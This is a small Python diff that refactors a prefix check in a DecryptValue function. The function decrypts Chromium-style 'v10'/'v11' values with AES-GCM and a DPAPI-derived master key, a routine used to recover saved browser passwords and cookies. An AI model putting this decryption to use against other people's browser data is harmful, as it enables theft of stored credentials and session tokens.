@@ -103,7 +103,7 @@ def CryptUnprotectData(encrypted_bytes, entropy=b""):
 
 def DecryptValue(buff, master_key=None):
     starts = buff.decode(encoding="utf8", errors="ignore")[:3]
-    if starts == "v10" or starts == "v11":
+    if starts in ("v10", "v11"):
         iv = buff[3:15]
         payload = buff[15:]
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
